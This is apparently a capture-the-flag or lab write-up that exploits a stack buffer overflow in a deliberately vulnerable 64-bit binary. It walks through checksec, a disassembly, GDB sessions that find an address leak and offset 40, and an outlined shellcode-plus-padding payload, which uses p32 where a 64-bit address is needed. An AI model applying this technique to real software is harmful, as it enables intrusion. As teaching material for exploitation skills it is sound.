# Binary and security


```r
robin@oracle:~/Pwn/0x01$ file vuln
vuln: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=d894883d2cc51001396b24c52ad8390d460c2383, not stripped
robin@oracle:~/Pwn/0x01$ checksec vuln
[*] '/home/robin/Pwn/0x01/vuln'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE
```

# Reverse Engineering and Debugging


Disassembling `main` of binary:-


```r
gef➤  disas main
Dump of assembler code for function main:
   0x00000000004005a7 <+0>:	push   rbp
   0x00000000004005a8 <+1>:	mov    rbp,rsp
   0x00000000004005ab <+4>:	sub    rsp,0x20
   0x00000000004005af <+8>:	lea    rax,[rbp-0x20]
   0x00000000004005b3 <+12>:	mov    rsi,rax
   0x00000000004005b6 <+15>:	lea    rdi,[rip+0xc7]        # 0x400684
   0x00000000004005bd <+22>:	mov    eax,0x0
   0x00000000004005c2 <+27>:	call   0x4004a0 <printf@plt>
   0x00000000004005c7 <+32>:	lea    rax,[rbp-0x20]
   0x00000000004005cb <+36>:	mov    rsi,rax
   0x00000000004005ce <+39>:	lea    rdi,[rip+0xb3]        # 0x400688
   0x00000000004005d5 <+46>:	mov    eax,0x0
   0x00000000004005da <+51>:	call   0x4004b0 <__isoc99_scanf@plt>
   0x00000000004005df <+56>:	lea    rax,[rbp-0x20]
   0x00000000004005e3 <+60>:	mov    rdi,rax
   0x00000000004005e6 <+63>:	call   0x400490 <puts@plt>
   0x00000000004005eb <+68>:	mov    eax,0x0
   0x00000000004005f0 <+73>:	leave  
   0x00000000004005f1 <+74>:	ret    
End of assembler dump.
gef➤  x/s 0x400684
0x400684:	"%p\n"
```

So, you have source code but let me get this:-

* It prints the value of `rbp - 0x20` which is stored in `rax` and transferred to `rsi` in first few lines. And `rdi` has `%p\n` so, let's understand it like this:-

In a function, let's say we take 2 parameters:-
First paramater is stored in `rdi` and second paramater is stored in `rsi` in 64 bit binaries.

So, here `printf("%p\n", rbp-0x20)`, let's run the binary but before that let's set a breakpoint at `ret` which is at `74`.


```r
gef➤  r
Starting program: /home/robin/Pwn/0x01/vuln 
0x7fffffffdcd0
hello
hello
[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x0               
$rbx   : 0x0               
$rcx   : 0x00007ffff7af4154  →  0x5477fffff0003d48 ("H="?)
$rdx   : 0x00007ffff7dd18c0  →  0x0000000000000000
$rsp   : 0x00007fffffffdcf8  →  0x00007ffff7a05b97  →  <__libc_start_main+231> mov edi, eax
$rbp   : 0x0000000000400600  →  <__libc_csu_init+0> push r15
$rsi   : 0x0000000000602260  →  "hello\nffffdcd0"
$rdi   : 0x1               
$rip   : 0x00000000004005f1  →  <main+74> ret 
$r8    : 0x00007ffff7fd04c0  →  0x00007ffff7fd04c0  →  [loop detected]
$r9    : 0x0               
$r10   : 0x3               
$r11   : 0x246             
$r12   : 0x00000000004004c0  →  <_start+0> xor ebp, ebp
$r13   : 0x00007fffffffddd0  →  0x0000000000000001
$r14   : 0x0               
$r15   : 0x0               
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffdcf8│+0x0000: 0x00007ffff7a05b97  →  <__libc_start_main+231> mov edi, eax	 ← $rsp
0x00007fffffffdd00│+0x0008: 0x0000000000000001
0x00007fffffffdd08│+0x0010: 0x00007fffffffddd8  →  0x00007fffffffe19f  →  "/home/robin/Pwn/0x01/vuln"
0x00007fffffffdd10│+0x0018: 0x0000000100008000
0x00007fffffffdd18│+0x0020: 0x00000000004005a7  →  <main+0> push rbp
0x00007fffffffdd20│+0x0028: 0x0000000000000000
0x00007fffffffdd28│+0x0030: 0xd62f05626b7de97c
0x00007fffffffdd30│+0x0038: 0x00000000004004c0  →  <_start+0> xor ebp, ebp
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x4005e6 <main+63>        call   0x400490 <puts@plt>
     0x4005eb <main+68>        mov    eax, 0x0
     0x4005f0 <main+73>        leave  
 →   0x4005f1 <main+74>        ret    
   ↳  0x7ffff7a05b97 <__libc_start_main+231> mov    edi, eax
      0x7ffff7a05b99 <__libc_start_main+233> call   0x7ffff7a27120 <__GI_exit>
      0x7ffff7a05b9e <__libc_start_main+238> mov    rax, QWORD PTR [rip+0x3ced23]        # 0x7ffff7dd48c8 <__libc_pthread_functions+392>
      0x7ffff7a05ba5 <__libc_start_main+245> ror    rax, 0x11
      0x7ffff7a05ba9 <__libc_start_main+249> xor    rax, QWORD PTR fs:0x30
      0x7ffff7a05bb2 <__libc_start_main+258> call   rax
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "vuln", stopped, reason: BREAKPOINT
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x4005f1 → main()
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────

Breakpoint 1, 0x00000000004005f1 in main ()
gef➤  x/20xg $rsp
0x7fffffffdcf8:	0x00007ffff7a05b97	0x0000000000000001
0x7fffffffdd08:	0x00007fffffffddd8	0x0000000100008000
0x7fffffffdd18:	0x00000000004005a7	0x0000000000000000
0x7fffffffdd28:	0xd62f05626b7de97c	0x00000000004004c0
0x7fffffffdd38:	0x00007fffffffddd0	0x0000000000000000
0x7fffffffdd48:	0x0000000000000000	0x29d0fa1ddd7de97c
0x7fffffffdd58:	0x29d0eaa2d1e3e97c	0x00007fff00000000
0x7fffffffdd68:	0x0000000000000000	0x0000000000000000
0x7fffffffdd78:	0x00007ffff7de5733	0x00007ffff7dcb638
0x7fffffffdd88:	0x000000001c622971	0x0000000000000000
gef➤  x/s 0x7fffffffdcd0
0x7fffffffdcd0:	"hello"
gef➤  
```

So, the leaked address has our input, nice. Now, let's provide a large input for segmentation fault as we it uses `gets` for input.

```r
gef➤  r
Starting program: /home/robin/Pwn/0x01/vuln 
0x7fffffffdcd0
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa
[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x0               
$rbx   : 0x0               
$rcx   : 0x00007ffff7af4154  →  0x5477fffff0003d48 ("H="?)
$rdx   : 0x00007ffff7dd18c0  →  0x0000000000000000
$rsp   : 0x00007fffffffdcf8  →  "faaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaala[...]"
$rbp   : 0x6161616161616165 ("eaaaaaaa"?)
$rsi   : 0x0000000000602260  →  "aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaaga[...]"
$rdi   : 0x1               
$rip   : 0x00000000004005f1  →  <main+74> ret 
$r8    : 0x00007ffff7fd04c0  →  0x00007ffff7fd04c0  →  [loop detected]
$r9    : 0x0               
$r10   : 0x3               
$r11   : 0x246             
$r12   : 0x00000000004004c0  →  <_start+0> xor ebp, ebp
$r13   : 0x00007fffffffddd0  →  0x0000000000000001
$r14   : 0x0               
$r15   : 0x0               
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffdcf8│+0x0000: "faaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaala[...]"	 ← $rsp
0x00007fffffffdd00│+0x0008: "gaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaama[...]"
0x00007fffffffdd08│+0x0010: "haaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaana[...]"
0x00007fffffffdd10│+0x0018: "iaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoa[...]"
0x00007fffffffdd18│+0x0020: "jaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapa[...]"
0x00007fffffffdd20│+0x0028: "kaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqa[...]"
0x00007fffffffdd28│+0x0030: "laaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaara[...]"
0x00007fffffffdd30│+0x0038: "maaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasa[...]"
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x4005e6 <main+63>        call   0x400490 <puts@plt>
     0x4005eb <main+68>        mov    eax, 0x0
     0x4005f0 <main+73>        leave  
 →   0x4005f1 <main+74>        ret    
[!] Cannot disassemble from $PC
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "vuln", stopped, reason: BREAKPOINT
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x4005f1 → main()
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────

Breakpoint 1, 0x00000000004005f1 in main ()
gef➤  x/s $rsp
0x7fffffffdcf8:	"faaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa"
gef➤  x/xg $rsp
0x7fffffffdcf8:	0x6161616161616166
gef➤  pattern search 0x6161616161616166
[+] Searching '0x6161616161616166'
[+] Found at offset 40 (little-endian search) likely
[+] Found at offset 33 (big-endian search) 
gef➤  
```

# Exploiting


Now, since stack is executable we can stored the shellcode at stack but within `40` since whatever goes after it will considered as an address and will overwrite RIP.

What we can do is:-

* Find a shellcode of length < 40
* Pad the shellcode to the offset of 40
* Use the leaked as thats where our input is stored
* So, payload will be like `shellcode + "A"*(40 - len(shellcode)) + p32(addr_leaked)`
* We are putting shellcode first so that when it jumps to that address it will execute the shellcode without even going upto the padding


Done!